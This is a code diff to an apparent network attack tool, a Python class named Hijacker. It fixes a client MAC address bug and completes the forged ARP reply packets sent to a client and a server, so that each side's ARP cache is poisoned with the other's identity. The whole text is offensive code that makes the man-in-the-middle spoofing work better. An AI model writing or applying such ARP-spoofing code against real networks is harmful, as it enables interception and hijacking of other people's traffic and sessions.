@@ -215,7 +215,7 @@ class Hijacker:
         server_mac = self.server.mac_addr
         if self.server_gateway is not None:
             server_mac = self.server_gateway.mac_addr
-        client_mac = self.server.mac_addr
+        client_mac = self.client.mac_addr
         if self.client_gateway is not None:
             client_mac = self.client_gateway.mac_addr
         if frame.src_addr == server_mac:
@@ -267,12 +267,16 @@ class Hijacker:
             server_arp_ip = self.server_gateway.ip_addr
             server_arp_mac = self.server_gateway.mac_addr
         self.client_spoofer.operation = 2
+        self.client_spoofer.src_addr = server_arp_mac
         self.client_spoofer.dst_addr = client_arp_mac
+        self.client_spoofer.snd_hw_addr = server_arp_mac
         self.client_spoofer.snd_ip_addr = server_arp_ip
         self.client_spoofer.tgt_hw_addr = server_arp_mac
         self.client_spoofer.tgt_ip_addr = server_arp_ip
         self.server_spoofer.operation = 2
+        self.server_spoofer.src_addr = client_arp_mac
         self.server_spoofer.dst_addr = server_arp_mac
+        self.server_spoofer.snd_hw_addr = client_arp_mac
         self.server_spoofer.snd_ip_addr = client_arp_ip
         self.server_spoofer.tgt_hw_addr = client_arp_mac
         self.server_spoofer.tgt_ip_addr = client_arp_ip
